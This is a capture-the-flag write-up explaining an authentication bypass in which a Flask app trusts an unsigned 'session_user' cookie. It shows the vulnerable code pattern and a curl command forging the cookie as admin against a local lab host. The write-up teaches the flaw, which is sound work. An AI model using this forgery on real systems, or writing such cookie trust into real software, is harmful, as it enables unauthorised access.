# 🍪 Challenge: Authentication Bypass 2

---

## Challenge Description

The challenge builds upon the previous authentication bypass level, but this time the vulnerability is a little more subtle.

The description hints:
> *"Authentication bypasses are not always so trivial... you control the requests, including all the HTTP headers sent!"*

This suggests that the bypass may involve something beyond simple query parameters — perhaps **HTTP headers or cookies**.

---

## Source Code Analysis

Although the full server code isn’t shown, based on the previous challenge, we can infer the following pattern:

```python
@app.route("/", methods=["GET"])
def challenge_get():
    username = flask.request.cookies.get("session_user")
    if not username:
        return "Please log in as admin to get the flag."
    elif username == "admin":
        return "Here is your flag: " + open("/flag").read()
```

This logic reveals the vulnerability:

The application trusts the `session_user` cookie to identify the logged-in user.

There is no validation to ensure the cookie value was legitimately issued by the server.

Therefore, an attacker can forge this cookie manually to impersonate the `admin` user.

## Exploitation

### Exploit Command

By manually crafting a request with the `session_user` cookie set to `admin`, we can trick the application into believing we are the administrator:

```SHELL
curl --cookie "session_user=admin" http://challenge.localhost:80
```

## Root Cause Analysis

| Component            | Vulnerability                       | Description                                                       |
| -------------------- | ----------------------------------- | ----------------------------------------------------------------- |
| Cookie Handling      | Client-side trust issue             | The app trusts the `session_user` cookie value sent by the client |
| Authentication Logic | Missing verification                | No session validation or signature                                |
| Developer Assumption | “Only the app will set this cookie” | Attackers can forge HTTP headers and cookies manually             |
